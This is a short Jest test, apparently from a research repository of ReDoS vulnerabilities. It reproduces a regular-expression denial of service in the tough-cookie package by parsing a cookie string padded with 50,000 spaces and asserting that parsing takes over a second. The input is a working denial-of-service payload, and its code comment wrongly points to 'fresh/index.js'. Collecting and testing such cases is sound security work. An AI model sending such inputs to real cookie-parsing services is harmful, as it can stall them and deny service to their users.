//https://github.com/sola-da/ReDoS-vulnerabilities/blob/master/test-though-cookie.js
test("ReDos in tough-cookie", () => {
  const genstr = require("./utils").genstr;
  const measureTime = require("./utils").measureTime;
  const tough = require("tough-cookie");

  let str = "x" + genstr(50000, " ") + "x"; //progblematic regex: / *, */, in fresh/index.js
  let Cookie = tough.Cookie;

  let t = measureTime(function () {
    var cookie = Cookie.parse(str);
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
